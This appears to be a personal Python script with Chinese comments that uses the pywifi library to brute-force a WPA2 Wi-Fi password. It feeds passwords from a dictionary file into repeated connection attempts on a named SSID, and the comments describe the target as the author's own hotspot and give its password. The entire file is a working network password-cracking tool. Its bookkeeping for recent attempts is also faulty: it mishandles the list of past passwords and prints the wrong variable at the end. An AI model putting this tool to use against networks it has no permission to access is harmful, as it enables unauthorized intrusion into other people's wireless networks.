# -*- coding: utf-8 -*-
"""
Created on Tue Jul 13 17:32:08 2021

@author: latpurple
"""

import pywifi
from pywifi import const
import time

wifi=pywifi.PyWiFi()
ifaces=wifi.interfaces()[0]
print(ifaces.name())
print(ifaces.status())
#打印扫描附近无线信号信息
# wireless=ifaces.scan_results()
# for data in wireless:
#     print(data.ssid)

#----测试连接，返回连接结果----
def crack(passwd,num):
    #先断开连接 
    ifaces.disconnect()
    wifi_status=ifaces.status()     #此时status为0
    # print('断开连接后，status是',wifi_status)
    if wifi_status==const.IFACE_DISCONNECTED:
        #创建wifi连接文件
        profile=pywifi.Profile()
        #要连接wifi的名称，这里使用自己的手机热点
        profile.ssid='qingdu'
        #网卡的开放状态
        profile.auth=const.AUTH_ALG_OPEN
        #wifi加密算法，wps2
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        #加密单元
        profile.cipher=const.CIPHER_TYPE_CCMP
        #调用密码，直接从密码字典取值,自己wifi密码是tl12345678
        profile.key=passwd
        #删除所有连接过的wifi文件
        ifaces.remove_all_network_profiles()
        #设定新的连接文件
        tep_profile=ifaces.add_network_profile(profile)
        #连接
        ifaces.connect(tep_profile)
        # print('连接前，ifaces_status is...',ifaces.status())
        #经过测试，发现延时设为0.5s比较适合
        time.sleep(0.5)
        # print('ifaces_status is...',ifaces.status())
        #设置每5条密码打印一次
        
        if ifaces.status()==const.IFACE_CONNECTED:              
            print(passwd,'成功连接')
            print('连接成功后，ifaces_status is...',ifaces.status())
            return True
        else:
            if num%5==0:
                print('第{}个密码   :'.format(num),passwd,'连接失败...')
                return False
        '''
        这里由于会有延时，就是连接上之后，status值会过几秒才会变，
        所以，即使密码正确，也会打印出‘连接错误’
        因此当status值变为4的时候，结束循环。然后打印出过去20条密码
        '''
# pas=crack('tl12345678')
if __name__ == '__main__':
    num=0
    flag=0
    tmp_passwd=[]
    start=time.time()
    f = open('passwd.txt','r')
    while True:
        passwd=f.readline().split('\n')[0]
        # print(type(passwd))
        tmp_passwd.append(passwd)
        num+=1
        if num>19:
            tmp_passwd[num%20]=passwd
        # print(passwd)
    
        while crack(passwd,num)==True:
            print('打印过去20条记录。。')
            for pwd in tmp_passwd:
                print(pwd)
            flag=1
            break
        if flag==1:
            print('爆破wifi密码结束，密码是：',pwd)
            break
    f.close()
    end=time.time()
    print('一共花费{}s时间'.format(end-start))
'''
最后发现，延时设为0.5时，不用打印前20条记录
'''